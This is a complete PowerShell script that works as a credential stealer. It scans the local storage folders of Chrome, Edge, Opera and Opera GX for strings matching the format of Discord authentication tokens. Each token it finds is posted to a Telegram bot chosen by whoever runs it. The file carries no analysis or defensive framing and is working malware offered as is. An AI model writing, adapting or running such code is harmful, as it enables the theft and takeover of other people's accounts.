param (
    [Parameter(Mandatory=$true)]
    [string]$botToken,

    [Parameter(Mandatory=$true)]
    [string]$chatId
)

$tokenRegex = '(mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27})'
$paths = @{
    "Chrome"    = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb"
    "Edge"      = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
    "Opera"     = "$env:APPDATA\Opera Software\Opera Stable\Local Storage\leveldb"
    "Opera GX"  = "$env:APPDATA\Opera Software\Opera GX Stable\Local Storage\leveldb"
}

function Send-ToTelegram {
    param (
        [string]$text,
        [string]$botToken,
        [string]$chatId
    )
    $body = @{
        chat_id = $chatId
        text    = $text
    } | ConvertTo-Json -Compress

    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" `
            -Method Post `
            -ContentType "application/json" `
            -Body $body
    } catch {
        Write-Host "`n❌ Telegram send failed: $_" -ForegroundColor Red
    }
}

function Get-TokenFromLevelDB {
    param ($folderPath)

    if (-not (Test-Path $folderPath)) { return $null }

    $files = Get-ChildItem -Path $folderPath -Include *.ldb,*.log -File -Recurse -ErrorAction SilentlyContinue

    foreach ($file in $files) {
        try {
            $match = Select-String -Path $file.FullName -Pattern $tokenRegex -List -ErrorAction Stop

            if ($match) {
                return @{ Token = $match.Matches[0].Value; File = $file.FullName }
            }
        } catch { }
    }

    return $null
}

$seenTokens = [System.Collections.Generic.HashSet[string]]::new()
foreach ($browser in $paths.Keys) {
    $info = Get-TokenFromLevelDB $paths[$browser]
    if ($info -and -not $seenTokens.Contains($info.Token)) {
        $seenTokens.Add($info.Token) | Out-Null
        Send-ToTelegram -text $info.Token -botToken $botToken -chatId $chatId
        Write-Host "`n$($info.Token)" -ForegroundColor Green
    } else {
        Write-Host "No new token found in $browser" -ForegroundColor DarkGray
    }
}
